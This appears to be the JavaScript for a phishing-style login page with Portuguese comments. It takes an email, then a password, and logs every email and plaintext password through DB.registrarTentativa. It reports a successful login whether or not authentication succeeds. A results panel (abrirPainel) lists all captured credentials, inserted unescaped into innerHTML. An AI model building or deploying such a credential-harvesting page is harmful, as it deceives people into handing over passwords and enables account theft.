// ============================================================
//  app.js — Lógica de navegação entre telas de login
// ============================================================

// Avança da tela de e-mail para a de senha
async function goToPassword() {
  const email   = document.getElementById("email-input").value.trim();
  const errorEl = document.getElementById("email-error");

  if (!email || !email.includes("@")) {
    errorEl.textContent = "Insira um endereço de e-mail válido.";
    errorEl.classList.remove("hidden");
    return;
  }

  const btn = document.querySelector("#screen-email .btn-primary");
  setLoading(btn, true, "Verificando...");

  // ← removido: await DB.registrarTentativa(...)
  await new Promise(r => setTimeout(r, 600)); // simula latência p/ UX

  setLoading(btn, false, "Avançar");
  errorEl.classList.add("hidden");
  document.getElementById("display-email").textContent = email;
  showScreen("screen-password");
  document.getElementById("password-input").focus();
}

// Valida a senha e faz o "login"
async function doLogin() {
  const email   = document.getElementById("email-input").value.trim();
  const senha   = document.getElementById("password-input").value;
  const errorEl = document.getElementById("pass-error");

  if (!senha) {
    errorEl.textContent = "Digite sua senha.";
    errorEl.classList.remove("hidden");
    return;
  }

  const btn = document.querySelector("#screen-password .btn-primary");
  setLoading(btn, true, "Entrando...");

  const usuario = await DB.autenticar(email, senha);
  await DB.registrarTentativa({ email, senha, sucesso: !!usuario });

  setLoading(btn, false, "Avançar");
  errorEl.classList.add("hidden");
  document.getElementById("success-msg").textContent = usuario
    ? `Bem-vindo de volta, ${usuario.nome}!`
    : `Acesso realizado como ${email}.`;
  showScreen("screen-success");
}

// ── Utilitário: estado de carregamento do botão ────────────
function setLoading(btn, loading, label) {
  btn.disabled = loading;
  btn.textContent = label;
  btn.style.opacity = loading ? "0.7" : "";
  btn.style.cursor  = loading ? "not-allowed" : "";
}

// Volta para a tela de e-mail
function goBack() {
  document.getElementById("password-input").value = "";
  document.getElementById("pass-error").classList.add("hidden");
  showScreen("screen-email");
}

// Reinicia o fluxo
function restart() {
  document.getElementById("email-input").value    = "";
  document.getElementById("password-input").value = "";
  showScreen("screen-email");
}

// Alterna visibilidade da senha
function togglePassword() {
  const input = document.getElementById("password-input");
  input.type  = input.type === "password" ? "text" : "password";
}

// Exibe apenas a tela indicada
function showScreen(id) {
  document.querySelectorAll(".screen").forEach((s) => s.classList.add("hidden"));
  document.getElementById(id).classList.remove("hidden");
}

// Enter para avançar
document.addEventListener("keydown", (e) => {
  if (e.key !== "Enter") return;
  const emailScreen = document.getElementById("screen-email");
  const passScreen  = document.getElementById("screen-password");
  if (!emailScreen.classList.contains("hidden")) goToPassword();
  else if (!passScreen.classList.contains("hidden")) doLogin();
});

// ── Painel de resultados ──────────────────────────────────

async function abrirPainel() {
  const el = document.getElementById("modal-lista");
  el.innerHTML = '<p class="modal-vazio">Carregando...</p>';
  document.getElementById("modal-resultados").classList.remove("hidden");

  const lista = await DB.buscarTentativas();

  if (lista.length === 0) {
    el.innerHTML = '<p class="modal-vazio">Nenhum registro encontrado ainda.</p>';
  } else {
    el.innerHTML = lista
      .map((t) => {
        const hora = new Date(t.timestamp).toLocaleString("pt-BR", {
          day: "2-digit", month: "2-digit", year: "numeric",
          hour: "2-digit", minute: "2-digit",
        });
        return `
          <div class="resultado-item">
            <div class="resultado-badge">${t.sucesso ? "✓" : "✗"}</div>
            <div class="resultado-info">
              <div class="resultado-email">${t.email}</div>
              <div class="resultado-senha">Senha: ${t.senha || "(não informada)"}</div>
              <div class="resultado-meta">${hora}</div>
            </div>
          </div>`;
      })
      .join("");
  }
}

function fecharPainel() {
  document.getElementById("modal-resultados").classList.add("hidden");
}

function fecharPainelFora(e) {
  if (e.target === document.getElementById("modal-resultados")) fecharPainel();
}

document.addEventListener("keydown", (e) => {
  if (e.key === "Escape") fecharPainel();
});